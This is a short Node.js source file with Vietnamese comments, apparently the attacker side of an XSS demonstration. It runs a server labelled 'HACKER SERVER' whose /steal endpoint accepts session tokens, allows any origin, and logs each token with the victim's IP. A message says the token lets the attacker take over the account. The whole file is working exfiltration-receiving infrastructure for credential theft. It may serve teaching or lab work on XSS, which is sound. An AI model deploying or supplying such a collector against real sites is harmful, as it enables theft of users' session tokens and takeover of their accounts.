const http = require('http');

const server = http.createServer((req, res) => {
  // Bật CORS để cho phép frontend gửi request đến
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  const url = new URL(req.url, `http://${req.headers.host}`);
  
  if (url.pathname === '/steal') {
    const token = url.searchParams.get('token');
    if (token) {
      console.log('\n======================================================');
      console.log('🚨 [HACKER SERVER] ĐÃ ĐÁNH CẮP ĐƯỢC TOKEN CỦA NẠN NHÂN! 🚨');
      console.log('======================================================');
      console.log(`Thời gian: ${new Date().toLocaleTimeString()}`);
      console.log(`Nạn nhân IP: ${req.socket.remoteAddress}`);
      console.log(`Token lấy được:\n\n${token}\n`);
      console.log('=> Hacker hiện có thể dùng token này để chiếm tài khoản!');
      console.log('======================================================\n');
    }
    
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'success' }));
  } else {
    res.writeHead(404);
    res.end();
  }
});

const PORT = 4000;
server.listen(PORT, () => {
  console.log(`[HACKER SERVER] Đang lắng nghe trên cổng ${PORT}...`);
  console.log(`[HACKER SERVER] Chờ đợi nạn nhân sập bẫy XSS...\n`);
});
